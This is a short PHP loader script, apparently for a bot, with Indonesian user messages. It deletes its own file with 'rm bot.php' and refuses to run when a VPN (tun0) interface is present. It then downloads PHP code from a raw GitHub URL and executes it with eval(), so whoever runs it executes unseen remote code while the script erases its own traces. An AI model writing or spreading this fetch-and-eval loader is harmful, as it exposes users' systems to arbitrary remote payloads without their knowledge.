system("rm bot.php");



function till(){
  $sistemm=shell_exec('2>/dev/null ifconfig');
    
   if(preg_match('/tun0/i',$sistemm)){
            echo mr.p."Ups Internet Mu Tidak Sehat\033[0m".n;
            echo "Silakan Matikan Vpn Anda\n";
        exit;
        }
    }
    
    till();
$function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/med.php");
eval($function);